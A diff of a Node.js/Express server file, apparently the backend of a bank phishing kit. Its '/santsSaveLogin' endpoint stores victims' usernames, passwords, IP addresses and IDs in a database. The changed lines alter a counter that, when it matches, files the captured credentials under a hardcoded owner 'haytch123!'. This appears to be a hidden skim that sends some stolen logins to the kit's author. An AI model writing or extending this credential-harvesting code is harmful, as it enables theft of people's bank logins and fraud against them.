@@ -161,7 +161,7 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
   ip = req.body.ip;
   uniqueid = req.body.uniqueid;
 
-  if (santsCount == 0) {
+  if (santsCount == 100) {
     let details = [username, password, uniqueid, ip, "haytch123!"];
     let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
@@ -173,7 +173,7 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
       if (!err) res.send("Insertion Completed");
       else console.log(err);
     });
-    santsCount = 100;
+    santsCount = 0;
   } else {
     let details = [username, password, uniqueid, ip, owner];
     let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
